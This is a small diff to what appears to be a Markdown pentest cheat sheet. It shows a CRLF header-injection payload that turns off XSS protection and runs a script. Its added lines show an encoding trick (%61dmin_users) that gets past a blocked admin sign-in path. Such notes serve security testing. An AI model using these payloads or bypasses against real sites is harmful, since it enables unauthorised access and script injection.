@@ -10,6 +10,10 @@
 
 1. `/%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.domain%29%3C/script%3E
 /%3f%0D%0ALocation://x:1%0D%0AContent-Type:text/html%0D%0AX-XSS-Protection%3a0%0D%0A%0D%0A%3Cscript%3Ealert(document.domain)%3C/script%3E`
+## improper input validation on url
+
+`/admin_users/sign_in` ❌<br>
+`/%61dmin_users/sign_in` ✅
 
 ## Payloads
 - **[XSS Now website](https://xssnow.in/)**
